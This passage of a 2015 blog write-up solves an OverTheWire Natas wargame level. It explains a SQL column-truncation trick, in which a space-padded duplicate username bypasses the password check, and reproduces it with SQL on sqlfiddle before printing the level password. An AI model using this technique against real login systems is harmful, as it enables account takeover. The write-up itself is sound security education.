<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>validUser() 
</span><span class='line'>  if user exists, checkCredentials()
</span><span class='line'>      if yay here is your data
</span><span class='line'>      if nay wrong password message
</span><span class='line'>  else createUser()</span></code></pre></td></tr></table></div></figure>


<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span> <span class="p">(</span>
</span><span class='line'>  <span class="o">`</span><span class="n">username</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span><span class="p">,</span>
</span><span class='line'>  <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28&#39;</span><span class="p">,</span><span class="s1">&#39;omgpass&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, the querying for the username as it happens in the validUser() function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;natas28&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the result:</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle.png" title="sqlfiddle" alt="sqlfiddle"></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'natas28                                                         '</span></code></pre></td></tr></table></div></figure>


<p>Then I added it to the table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28                                                         &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle2.png" title="sqlfiddle2" alt="sqlfiddle2"></p>

<p>To summarize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># with input of 'natas28                                                                end'
</span><span class='line'>validUser() 
</span><span class='line'>  long string is truncated to natas28 end, which doesn't exist in the table
</span><span class='line'>createUser()
</span><span class='line'>  # input becomes 'natas28                                                         '
</span><span class='line'>  the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</span><span class='line'># now check again with username of natas28 and no password
</span><span class='line'>validUser() 
</span><span class='line'>  username already exists, so checkCredentials()
</span><span class='line'>  with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about</span></code></pre></td></tr></table></div></figure>


<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

<p><img class="center" src="/images/overthewire/natas/gz.png" title="gz" alt="gz"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>&lt; You will triumph over your enemy. &gt;
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2015-11-30T04:50:00-05:00" pubdate data-updated="true">Nov 30<span>th</span>, 2015</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/linux/'>linux</a>, <a class='category' href='/blog/categories/wargames/'>wargames</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/11/26/cloning-octopress-blog/" title="Previous Post: Cloning Octopress blog">&laquo; Cloning Octopress blog</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/" title="Next Post: Exploit Exercises - Nebula levels 00-10">Exploit Exercises - Nebula levels 00-10 &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2017/06/11/automater-kali-linux-tools/">Automater - Kali Linux tools</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/10/masscan-kali-linux-tools/">Masscan - Kali Linux tools</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/09/quick-shares-with-samba-on-centos/">Quick shares with Samba on CentOS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/07/lbd-kali-linux-tools/">lbd - Kali Linux tools</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/06/tr0ll-2-there-be-trolls/">Tr0ll 2 - There be trolls</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>

</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2017 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2015/11/30/overthewire-natas/';
        var disqus_url = 'http://chousensha.github.io/blog/2015/11/30/overthewire-natas/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
